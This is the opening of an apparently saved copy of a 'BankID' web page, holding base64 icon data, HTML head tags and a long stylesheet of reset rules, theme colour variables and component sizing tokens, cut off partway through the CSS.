/89hO//PYTv/z2E7/89hO//PYTv/z2E7/89he//PYXv/z2F7/89hO//PITv/zyE7/87g+//OYLu/zaA7v8yfe7/LHns/yJz6v8cbef/HG3l/x9u4v8fbN7/HmjX/xxkz/8aXsT/FFW1/ztrsu1MdbK4EE6q/xlauv8bX8X/HGTO/xxn1f8ZZtn/KHHg/02M6/9qoPL/eav1/4Cu9v+Csfb/hLL2/4Sy9v+Esvb/hLL2/4Wy9v+Fsvb/hbL2/4Wy9v+Fsvb/hbL2/4Wy9v+Fsvb/hbL2/4Wy9v+Fsvb/hbL2/4Wy9v+Fsvb/hLL2/4Sy9v+Esvb/hLL2/4Ox9v+Ar/b/e6z1/2+j8v9Vkuz/L3fi/xpn2v8cZtb/HWXP/xtgx/8aXLz/FlSv/yJYqLswYqx8FlCl/xhWsv8ZW7z/Gl7E/xtiy/8/ftz/dqbv/4m19f+KtPX/iLP1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4ez9f+Hs/X/h7P1/4m09f+LtfX/fqzy/02I4f8fZc7/Gl/F/xpcvv8ZV7T/E06m/y9hq7tdg7toE0uc/xdRp/8YVrH/GFi4/zt2zv97qOv/hrHx/4Ku8P+BrvH/ga3w/4Ct8P9/rfD/f6zw/36s8P9+q/D/fqvv/36r7/9+q+//fqvv/36r7/9+q+//fqvv/36r7/9+q+//fqvv/36r7/9+q+//fqvv/36r7/9+q+//fqvv/36r7/9+q/D/f6zw/3+t8P+ArfD/gK3w/4Gu8P+CrvH/hbDx/4Kt7/9KgtX/Glu6/xhWsv8YU6n/DUac/1l+tqOkuNYnKlqg+w5GmP8VUKT/F1Os/yJetv8uaL//MWvD/zBrxf8ua8X/K2nF/ylnxP8nZsP/JmbD/yVlw/8lZMP/JGTC/yRkwv8kZML/JGTC/yRkwv8kZML/JGTC/yRkwv8kZMP/JGTD/yRkw/8kZMP/JGTD/yRkw/8kZMP/JGTC/yRkw/8lZcP/JmXD/ydmw/8pZ8T/K2jE/y1qxf8va8X/MGzE/y5pwf8lYLj/GFWu/xdQpv8RSJz/F0uZ/6K10lDI0+QAdJXFZSJUnfUTSZj/FUye/wxHn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P8aYs//KmW88C5nu/AYYMv/Hmve/x9x6/8bcfP/rMv5/////f///v7//v7+/////v////7////+//7+/v////7////+/3Sr+/8Qbvr/o8f8/////v////7//v7+/////v////7////+//7+/v////3///78/2eg9f8WbOz/H2zg/xpiz/8qZLzwLme78Blgy/8ea97/GGzr/0+R8//7+/v////9//7+/v////7/5e/9/73W/f/u9P7////+//7+/v//////2Oj+/1WX+//5+/////////7+/v////7/6fH9/9Xl/f/+/v7////+//39/v////z/0eD3/yR07f8ca+D/GmLP/ypkvPAtZrvwGWDL/x5r3v8RaOv/hrL1////+//+/f3////+/9zq/f89ifv/F3L6/0uS+//p8v7////////////3+///zuH+/////////////////8zg/f82hfv/Hnb6/3ar/P/6/P7////+//79/P/29/j/Sozt/xdo4P8aYs//KmS88C1mu/AZYMz/Hmvf/xRq6/+avvX////7//7+/v////7/lr/8/xBu+v8fd/r/FnH6/7DP/v//////////////////////////////////////dKv8/xBu+v8ddvr/Hnb6/8rf/f////7//f38//v6+P9imu7/FGbg/xpiz/8qZbzwLWa78BlgzP8ea9//E2nr/5i99f////z//v7+/////v+cw/z/FnL6/yF5+v8Vcfv/kLz9//////////////////////////////////////9xqP3/FnL6/yB4+v8gd/r/vtj9/////v/+/fz/+fn4/12X7v8VZuH/GmLP/yllvPAtZrvwGWDM/x5r3/8Raev/hLL1/////P/+/v7////+/8Pa/f8edvr/IXj6/x12+/87iPz/utX+/9no/v/Z6P7/2ej+/9no/v/Z6P7/2ej+/2Og/f8Yc/v/IHj6/x93+v+91/3////+///+/P/v8/j/PIPt/xlp4f8aYtD/KWW88C1mu/AZYMz/Hmvf/xZs6/9amPX//v38/////v////7/9/r+/0yS+/8Ycvv/I3r7/x12+/8gePv/KH37/yh9+/8offv/KH37/yh9+/8offv/JHr7/yJ5+/8bdfr/JXv6/9jn/v////7////8/6vJ9v8ab+3/HWzh/xpi0P8pZb3wLWa78BlgzP8ea9//HHDr/yd58//T4/v////+//7+/v////7/x939/yV7+/8Zc/v/Inn7/yB4+/8fd/v/H3f7/x93+/8fd/v/H3f7/x93+/8hePv/H3f7/zKD+v+00f3////+//7//v////z/c6f1/xJq7f8fbOH/GmLQ/yllvfAtZrvwGWDM/x5r3/8fcev/GHDz/7DO+v////7//v7+//7+/v////7/xtz+/0GM/P8Yc/v/FXH7/xhz+/8Yc/v/GHP7/xhz+/8Zc/v/Hnb7/yJ5+/8fd/v/LH/6/9Xl/f////7//v7+/////P+20Pf/HHDt/x1s4f8aYtD/KWW88C1mu/AZYMz/Hmvf/xlu6/9HjPP/8/b7/////v/+/v7////+/+ry/f/Q4v3/sdD+/4m3/f9vp/3/X578/2Cf/P9gn/z/YZ/8/16d/P81hPz/HXb7/yJ5+/8Wcvr/Y6D7//7+/v////7////8/+rv+P8zfu3/Gmrh/xpiz/8pZbzwLWa78BlhzP8ea9//Emnr/4Kw9f////v//v7+/////v/X5/3/Ooj7/x93+v8gePr/ttP+/////////////////////////////////9zq/v84hvv/Hnf6/x93+v8sf/r/4+7+/////v/+/fz/9/f4/1KR7f8WaOD/GmLP/yllvPAtZrvwGWHL/x5r3v8Taev/mL71////+//9/f7////+/5a//P8Qbvr/H3f6/xZy+v+lyf3//////////////////////////////////////2mk+/8Xcvr/IHj6/x53+v+/2P3////+//39/P/7+vj/Y5vu/xRm4P8aYs//KWS88C1mu/AZYMv/Hmve/xJp6/+UuvX////7//39/f////7/rc39/xNv+v8TcPr/G3X6/8bc/f////////////3+///3+v////////7+//////7/grP8/w1s+v8Xcvr/Jnv6/9no/v////7//f38//v6+P9fme7/FGbg/xpiz/8qZLzwLWa78Bhgy/8ea97/E2rr/3Gl9P////v//v79/////v/6+/7/kbz8/1SY+/+gxfz//v7+//7+/v////7/7PT+/6HG/f////7//v7+/////v/k7v3/ZKH7/z+K+/+myfz////+//7+/f///vz/8vT4/0CF7f8YaeD/GmLP/ypkvPAtZbrwGGDL/x5r3v8bb+v/MX/z/+Tt+/////3//v7+/////v////7////+/////v////7//v7+/////v+wzv3/M4P6/+70/v////7//v7+/////v////7/+Pr+/////v///v7//f39/////P+70/f/HXDs/x1s4P8aYs//KmS88C5muvAYYMv/Hmve/yBx6v8Wb/P/a6T4//7+/f////7//v7+///+/v////7///7+/////v////7/5vD+/z+L+/8Qbvr/gLL8/////v////7//v7+/////v////7///7+//7+/v////3/7vP7/0iN9P8Ybez/H2zg/xpizv8qZLvwLma58Bhfyf8eat3/IHHq/yB08f8YcfX/cqj5/+ry/P////3////9/////f////7////+/9Hi/f9Kkfv/GHP5/yF4+v8cdfr/i7j8//n7/v////7////9/////f////3////9/+Hs/P9XmPj/Fm7y/yBx6/8fbN//GmLN/ypkuvAuZbjwGF7I/x5p2/8fcOj/IXTw/yB19P8Wcfb/PYj3/4Oy+f+91fr/0eL7/7jT+v90qfn/KX34/xly9/8iePj/Inj4/x92+P8Ycvf/UJP5/6vL+v/n7/v/8fX7/9Li+/+LuPn/NoP2/xdw9P8hdPH/H3Dp/x5q3f8ZYMv/KmS58C9ltfAXXcT/HmjX/x9u4/8gcuz/IHTw/x908v8ZcPP/EWzz/xxy8/8idvP/GnHz/xFs8/8acfT/HnT0/x109P8ddPT/HXT0/x1z9P8UbvP/F2/z/yl68/8uffP/Inbz/xNt8/8acfL/IXPx/yBy7f8fb+X/HmnZ/xhfx/8rY7bxN2mz8RVYvf8cZND/HWrc/xxs4/8bbef/JHTr/yx67v8xfe//MX7v/zJ+8P8zf/D/NYDw/zWA8P81gPD/NYDw/zWA8P81gPD/NYDw/zWA8P80f/D/MX7w/zB87/8vfO//LXru/yV17P8cbuj/HG3k/x5r3f8dZdL/F1vA/y1jsu4rX6rPFVSz/xtfxf8aY9D/KnHc/1eT6/92qPP/gK/2/4Ox9v+Esfb/hLL2/4Sy9v+Esvb/hLL2/4Sy9v+Esvb/hLL2/4Sy9v+Esvb/hLL2/4Sy9v+Esvb/hLH2/4Ox9v+Br/b/eKr0/12X7f8vdd7/GmPR/xtgx/8YV7b/H1eozjporaYQS6P/Fla0/yppyP9un+j/h7Hy/4Ov8f+BrfH/gK3w/3+s8P9/rPD/f6zw/3+s8P9+rPD/f6zw/3+s8P9/rPD/f6zw/36s8P9/rPD/f6zw/3+s8P9/rPD/gK3w/4Gt8f+Dr/H/h7Ly/3al6/8ycMz/Fla2/xBLpf86aKzCjqfMUBhMmv8OSJ7/GlWt/yZhuf8nY73/JmO9/yNhvf8jYb7/ImC9/yFgvf8hYL3/IWC9/yFgvf8hYL3/IWC9/yBfvf8gX7z/IF+8/yBfvf8gX73/IF+9/yBfvf8hYL3/JGK+/yZkvv8pZL3/KWO6/x1Yr/8QSqH/D0aY/4Gcxm+3x94AbpDDUjtprawrW6XUM2Or8CdcqvAlW6rwJFqr8BxUp/AcVKfwHFSn8BxUp/AcVKfwHFSn8BxUp/AcVKjwI1qr8CNaq/AjWqvwI1qr8CNaq/AkWqvwJFqr8CRaq/AcVKfwHVSm8B1TpPAhVqTwIVSh5jNiqcJdg7xfnrXXAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAA">
        <link rel="icon" data-savepage-href="" href="">
        <meta charset="UTF-8">
        <title>BankID</title>
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=yes,viewport-fit=cover">
        <style data-savepage-href="">
            body,
            html {
                border: 0;
                font-family: inherit;
                font-size: 100%;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                vertical-align: baseline;
            }
            a,
            abbr,
            acronym,
            address,
            applet,
            article,
            aside,
            audio,
            b,
            big,
            blockquote,
            canvas,
            caption,
            center,
            cite,
            code,
            dd,
            del,
            details,
            dfn,
            div,
            dl,
            dt,
            em,
            embed,
            fieldset,
            figcaption,
            figure,
            footer,
            form,
            h1,
            h2,
            h3,
            h4,
            h5,
            h6,
            header,
            hgroup,
            i,
            iframe,
            img,
            ins,
            kbd,
            label,
            legend,
            li,
            mark,
            menu,
            nav,
            object,
            ol,
            output,
            p,
            pre,
            q,
            ruby,
            s,
            samp,
            section,
            small,
            span,
            strike,
            strong,
            sub,
            summary,
            sup,
            table,
            tbody,
            td,
            tfoot,
            th,
            thead,
            time,
            tr,
            tt,
            u,
            ul,
            var,
            video {
                border: 0;
                font-family: inherit;
                font-size: inherit;
                font-style: inherit;
                font-variant: inherit;
                font-weight: inherit;
                margin: 0;
                padding: 0;
                vertical-align: baseline;
            }
            article,
            aside,
            details,
            figcaption,
            figure,
            footer,
            header,
            hgroup,
            menu,
            nav,
            section {
                display: block;
            }
            body {
                line-height: 1;
            }
            ol,
            ul {
                list-style: none;
            }
            blockquote,
            q {
                quotes: none;
            }
            blockquote:after,
            blockquote:before,
            q:after,
            q:before {
                content: "";
                content: none;
            }
            table {
                border-collapse: collapse;
                border-spacing: 0;
            }
            * {
                -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
                -webkit-box-sizing: border-box;
                box-sizing: border-box;
            }
            :focus {
                outline: none;
                outline-offset: -2px;
            }
            :focus::-moz-focus-inner {
                border: 0;
            }
            button,
            input,
            select,
            textarea {
                -webkit-appearance: none;
                background: none;
                border: none;
                -moz-box-shadow: none;
                color: inherit;
                font-family: inherit;
                font-size: inherit;
                letter-spacing: inherit;
                margin: 0;
                outline: none;
                padding: 0;
            }
            input::-webkit-input-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input::-moz-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input:-ms-input-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input::-ms-input-placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            input::placeholder {
                font-family: inherit;
                font-size: inherit;
            }
            :root {
                --bgColor-default: #faf7f4;
                --bgColor-elevated: #fff;
                --bgColor-state-hover: #ebeeeb;
                --bgColor-state-active: #dadeda;
                --bgColor-interactive-rest: var(--bgColor-elevated);
                --bgColor-interactive-hover: var(--bgColor-state-hover);
                --bgColor-interactive-active: var(--bgColor-state-active);
                --bgColor-interactive-variant: #c9fb88;
                --bgColor-variant: #c9fb88;
                --bgColor-backdrop-rest: rgba(0, 0, 0, 0.4);
                --bgColor-backdrop-merchant: var(--bgColor-default);
                --fgColor-default: #121a12;
                --fgColor-subtle: #4d514c;
                --fgColor-link-rest: #156200;
                --fgColor-link-hover: #0d4904;
                --fgColor-link-active: #0b3208;
                --fgColor-variant: #39134c;
                --fgColor-status-danger: #8b000f;
                --fgColor-status-success: #093d05;
                --fgColor-inverted: #f9f5ff;
                --borderColor-default: #6a6867;
                --borderColor-muted: #dadeda;
                --borderColor-variant: #121a12;
                --borderColor-focusVariant: #121a12;
                --borderColor-focus: #121a12;
                --borderColor-status-danger: #8b000f;
                --borderColor-hover: rgba(0, 0, 0, 0.302);
                --component-Document-borderColor-body: #ebeeeb;
                --component-Button-outline-borderColor-rest: #39134c;
                --component-Button-outline-borderColor-hover: #39134c;
                --component-Button-outline-borderColor-active: #39134c;
                --component-Button-filled-bgColor-rest: #39134c;
                --component-Button-filled-bgColor-hover: #47146a;
                --component-Button-filled-bgColor-active: #551488;
                --component-Button-filled-bgColor-invalid: rgba(249, 247, 255, 0.702);
                --app-Scrollbar-bgColor-default: rgba(0, 0, 0, 0.071);
                --app-Scrollbar-fgColor-default: var(--fgColor-inverted);
                --brand: var(--fgColor-variant);
            }
            @media (prefers-color-scheme: dark) {
                html:not([data-theme]) {
                    --bgColor-default: #0f150f;
                    --bgColor-elevated: #1d211d;
                    --bgColor-state-hover: #3c403b;
                    --bgColor-state-active: #4d514c;
                    --bgColor-interactive-rest: var(--bgColor-elevated);
                    --bgColor-interactive-hover: var(--bgColor-state-hover);
                    --bgColor-interactive-active: var(--bgColor-state-active);
                    --bgColor-interactive-variant: #c9fb88;
                    --bgColor-variant: #093d05;
                    --bgColor-backdrop-rest: hsla(0, 0%, 100%, 0.4);
                    --bgColor-backdrop-merchant: var(--bgColor-default);
                    --fgColor-default: #eaecea;
                    --fgColor-subtle: #ccd1cc;
                    --fgColor-link-rest: #c9fb88;
                    --fgColor-link-hover: #b0f666;
                    --fgColor-link-active: #96f143;
                    --fgColor-variant: #caafff;
                    --fgColor-status-danger: #ffd9d9;
                    --fgColor-status-success: #67e702;
                    --fgColor-inverted: #121a12;
                    --borderColor-default: #cac7c3;
                    --borderColor-muted: #333732;
                    --borderColor-variant: #fff;
                    --borderColor-focusVariant: #fff;
                    --borderColor-focus: #fff;
                    --borderColor-status-danger: #ffd9d9;
                    --borderColor-hover: hsla(0, 0%, 100%, 0.302);
                    --component-Document-borderColor-body: hsla(0, 0%, 100%, 0);
                    --component-Button-outline-borderColor-rest: #caafff;
                    --component-Button-outline-borderColor-hover: #caafff;
                    --component-Button-outline-borderColor-active: #caafff;
                    --component-Button-filled-bgColor-rest: #c09fff;
                    --component-Button-filled-bgColor-hover: #caafff;
                    --component-Button-filled-bgColor-active: #d5beff;
                    --component-Button-filled-bgColor-invalid: rgba(249, 247, 255, 0.702);
                    --app-Scrollbar-bgColor-default: hsla(0, 0%, 100%, 0.2);
                    --app-Scrollbar-fgColor-default: var(--fgColor-inverted);
                    --brand: #fff;
                }
            }
            html[data-theme="dark"] {
                --bgColor-default: #0f150f;
                --bgColor-elevated: #1d211d;
                --bgColor-state-hover: #3c403b;
                --bgColor-state-active: #4d514c;
                --bgColor-interactive-rest: var(--bgColor-elevated);
                --bgColor-interactive-hover: var(--bgColor-state-hover);
                --bgColor-interactive-active: var(--bgColor-state-active);
                --bgColor-interactive-variant: #c9fb88;
                --bgColor-variant: #093d05;
                --bgColor-backdrop-rest: hsla(0, 0%, 100%, 0.4);
                --bgColor-backdrop-merchant: var(--bgColor-default);
                --fgColor-default: #eaecea;
                --fgColor-subtle: #ccd1cc;
                --fgColor-link-rest: #c9fb88;
                --fgColor-link-hover: #b0f666;
                --fgColor-link-active: #96f143;
                --fgColor-variant: #caafff;
                --fgColor-status-danger: #ffd9d9;
                --fgColor-status-success: #67e702;
                --fgColor-inverted: #121a12;
                --borderColor-default: #cac7c3;
                --borderColor-muted: #333732;
                --borderColor-variant: #fff;
                --borderColor-focusVariant: #fff;
                --borderColor-focus: #fff;
                --borderColor-status-danger: #ffd9d9;
                --borderColor-hover: hsla(0, 0%, 100%, 0.302);
                --component-Document-borderColor-body: hsla(0, 0%, 100%, 0);
                --component-Button-outline-borderColor-rest: #caafff;
                --component-Button-outline-borderColor-hover: #caafff;
                --component-Button-outline-borderColor-active: #caafff;
                --component-Button-filled-bgColor-rest: #c09fff;
                --component-Button-filled-bgColor-hover: #caafff;
                --component-Button-filled-bgColor-active: #d5beff;
                --component-Button-filled-bgColor-invalid: rgba(249, 247, 255, 0.702);
                --app-Scrollbar-bgColor-default: hsla(0, 0%, 100%, 0.2);
                --app-Scrollbar-fgColor-default: var(--fgColor-inverted);
                --brand: #fff;
            }
            html[data-theme="dark"] #app {
                color-scheme: dark;
            }
            :root {
                --spacing-6XS: 2px;
                --spacing-5XS: 4px;
                --spacing-4XS: 6px;
                --spacing-3XS: 8px;
                --spacing-2XS: 10px;
                --spacing-XS: 12px;
                --spacing-S: 16px;
                --spacing-M: 24px;
                --spacing-L: 32px;
                --borderRadius-2XS: 4px;
                --borderRadius-XS: 8px;
                --borderRadius-S: 12px;
                --borderRadius-M: 18px;
                --borderRadius-L: 24px;
                --borderRadius-interactive-M: 8px;
                --borderRadius-interactive-L: 8px;
                --fontSize-S: 14px;
                --fontSize-M: 16px;
                --fontSize-L: 18px;
                --fontSize-XL: 20px;
                --fontSize-2XL: 24px;
                --fontSize-3XL: 26px;
                --component-OtpChallenge-fontSize-L: 36px;
                --component-OtpChallenge-spinner: 60px;
                --component-Form-height-large: 285px;
                --component-Form-width-large: 320px;
                --component-Form-width-medium: 360px;
                --component-Form-gap-inputs: var(--spacing-2XS);
                --component-Button-Round-size-M: 18px;
                --component-Button-Round-size-L: 22px;
                --component-Button-height-L: 32px;
                --component-Button-height-M: 26px;
                --component-Button-height-S: 20px;
                --component-Error-icon-L: 48px;
                --sizing-interactive-M: 38px;
                --sizing-interactive-L: 48px;
                --sizing-icon-S: 16px;
                --sizing-icon-M: 20px;
                --sizing-icon-L: 24px;
                --sizing-content-width: 370px;
                --sizing-content-height: 250px;
                --borderSize-focus: 2px;
                --borderSize-focusOuter: 3px;
                --borderSize-underline: 2px;
                --app-Width: 450px;
                --app-Height: 520px;
                --app-borderRadius-L: 16px;
                --app-padding-horizontal: 16px;
                --app-padding-vertical: 10px;
                --app-padding-content: 4px;
                --app-Body-height: 390px;
                --app-Modal-padding-top: 20px;
                --app-Modal-padding-bottom: 16px;
                --gap-content-L: 10px;
                --shadow-focus: inset 0px 0px 0px var(--borderSize-focus) var(--fgColor-default);
                --shadow-focusOuter: 0px 0px 0px 1px var(--bgColor-default),
                    0px 0px 0px var(--borderSize-focusOuter) var(--fgColor-default);
                --shadow-danger: inset 0px 0px 0px 1px var(--fgColor-status-danger);
                --shadow-dangerFocus: inset 0px 0px 0px var(--borderSize-focus) var(--fgColor-status-danger);
                --shadow-hover: 0px 4px 4px 0px var(--borderColor-hover);
                --shadow-button-outline-rest: inset 0px 0px 0px 1px var(--fgColor-variant);
                --shadow-button-outline-hover: inset 0px 0px 0px 1px var(--fgColor-variant);
                --shadow-button-outline-active: inset 0px 0px 0px 1px var(--fgColor-variant);
                --shadow-form-rest: inset 0px 0px 0px 1px var(--fgColor-default);
            }
            @media screen and (max-height: 350px) {
                :root {
                    --spacing-6XS: 1px;
                    --spacing-5XS: 2px;
                    --spacing-4XS: 4px;
                    --spacing-3XS: 6px;
                    --spacing-2XS: 8px;
                    --spacing-XS: 10px;
                    --spacing-S: 12px;
                    --spacing-M: 16px;
                    --spacing-L: 24px;
                    --borderRadius-2XS: 2px;
                    --borderRadius-XS: 4px;
                    --borderRadius-S: 8px;
                    --borderRadius-M: 12px;
                    --borderRadius-L: 18px;
                    --borderRadius-interactive-M: 4px;
                    --borderRadius-interactive-L: 4px;
                    --fontSize-S: 14px;
                    --fontSize-M: 16px;
                    --fontSize-L: 18px;
                    --fontSize-XL: 20px;
                    --fontSize-2XL: 24px;
                    --fontSize-3XL: 26px;
                    --component-OtpChallenge-fontSize-L: 30px;
                    --component-OtpChallenge-spinner: 40px;
                    --component-Form-height-large: 160px;
                    --component-Form-width-large: 360px;
                    --component-Form-width-medium: 300px;
                    --component-Form-gap-inputs: var(--spacing-2XS);
                    --component-Button-Round-size-M: 16px;
                    --component-Button-Round-size-L: 20px;
                    --component-Button-height-L: 26px;
                    --component-Button-height-M: 22px;
                    --component-Button-height-S: 16px;
                    --component-Error-icon-L: 36px;
                    --sizing-interactive-M: 28px;
                    --sizing-interactive-L: 38px;
                    --sizing-icon-S: 14px;
                    --sizing-icon-M: 16px;
                    --sizing-icon-L: 20px;
                    --sizing-content-width: 370px;
                    --sizing-content-height: 0px;
                    --borderSize-focus: 2px;
                    --borderSize-focusOuter: 3px;
                    --borderSize-underline: 2px;
                    --app-Width: 396px;
                    --app-Height: 300px;
                    --app-borderRadius-L: 8px;
                    --app-padding-horizontal: 8px;
                    --app-padding-vertical: 8px;
                    --app-padding-content: 4px;
                    --app-Body-height: 260px;
                    --app-Modal-padding-top: 16px;
                    --app-Modal-padding-bottom: 10px;
                    --gap-content-L: 6px;
                }
            }
            :root {
                --font-body-S-Regular: 400 var(--fontSize-S) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-S-Regular-lineHeight: calc(var(--fontSize-S) * 1.17);
                --font-body-S-Medium: 500 var(--fontSize-S) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-S-Medium-lineHeight: calc(var(--fontSize-S) * 1.17);
                --font-body-S-Bold: 600 var(--fontSize-S) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-S-Bold-lineHeight: calc(var(--fontSize-S) * 1.17);
                --font-body-M-Regular: 400 var(--fontSize-M) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-M-Regular-lineHeight: calc(var(--fontSize-M) * 1.17);
                --font-body-M-Medium: 500 var(--fontSize-M) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-M-Medium-lineHeight: calc(var(--fontSize-M) * 1.17);
                --font-body-L-Regular: 400 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-L-Regular-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-body-L-Medium: 500 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-L-Medium-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-body-XL-Bold: 600 var(--fontSize-XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-XL-Bold-lineHeight: calc(var(--fontSize-XL) * 1.17);
                --font-body-2XL-Bold: 600 var(--fontSize-2XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-body-2XL-Bold-lineHeight: calc(var(--fontSize-2XL) * 1.17);
                --font-heading-S-Medium: 500 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-S-Medium-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-heading-S-Bold: 700 var(--fontSize-L) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-S-Bold-lineHeight: calc(var(--fontSize-L) * 1.17);
                --font-heading-M-Bold: 600 var(--fontSize-XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-M-Bold-lineHeight: calc(var(--fontSize-XL) * 1.17);
                --font-heading-L-Bold: 600 var(--fontSize-2XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-L-Bold-lineHeight: calc(var(--fontSize-2XL) * 1.17);
                --font-heading-XL-Bold: 600 var(--fontSize-3XL) / 1.17 -apple-system, BlinkMacSystemFont, sans-serif;
                --font-heading-XL-Bold-lineHeight: calc(var(--fontSize-3XL) * 1.17);
                --font-OtpChallenge-Reference-L: 600 var(--component-OtpChallenge-fontSize-L) / 1.17 -apple-system,
                    BlinkMacSystemFont, sans-serif;
                --font-OtpChallenge-Reference-L-lineHeight: calc(var(--component-OtpChallenge-fontSize-L) * 1.17);
                --font-Document-L: 400 var(--fontSize-M) / 1.17 Courier;
                --font-Document-L-lineHeight: calc(var(--fontSize-M) * 1.17);
                --full-dvh: 100%;
            }
            @supports (height: 100vh) {
                :root {
                    --full-dvh: 100vh;
                }
            }
            @supports (height: 100dvh) {
                :root {
                    --full-dvh: 100dvh;
                }
            }
            body,
            html {
                margin: 0;
                padding: 0;
